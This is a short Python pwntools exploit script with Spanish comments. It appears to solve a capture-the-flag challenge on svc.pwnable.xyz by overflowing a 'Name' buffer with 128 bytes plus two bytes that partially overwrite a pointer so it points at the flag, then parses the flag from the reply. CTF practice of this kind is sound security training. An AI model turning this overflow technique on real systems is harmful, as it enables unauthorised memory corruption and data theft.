#!/usr/bin/env python3

from pwn import *

conn = remote('svc.pwnable.xyz', 30004)

conn.recvuntil(b'[y/N]: ')
conn.sendline(b'y')

conn.recvuntil(b'Name: ')

# Sobrescribir los primeros 2 bytes de [0x601160]
# Offset desde usr (0x6010e0): 128 bytes

# Payload: 128 bytes + 0x80 + 0x10
# Esto cambia el puntero de 0x601168 a 0x601080 (flag)

payload = b'D' * 128 + b'\x80\x10'

log.info(f"Enviando {len(payload)} bytes...")
log.info(f"Payload (últimos 10 bytes): {payload[-10:].hex()}")

conn.sendline(payload)

data = conn.recvall(timeout=3)
log.info(f"Respuesta completa:\n{data}")
log.info(f"Hex: {data.hex()}")

# Buscar FLAG
if b'FLAG{' in data:
    # Verificar que NO sea la flag falsa
    if b'the_real_flag_will_be_here' not in data:
        log.success("¡FLAG REAL ENCONTRADA!")
        start = data.find(b'FLAG{')
        end = data.find(b'}', start) + 1
        flag = data[start:end]
        log.success(f"FLAG: {flag.decode()}")
    else:
        log.warning("Es la flag falsa")
else:
    log.warning("No se encontró FLAG")

conn.close()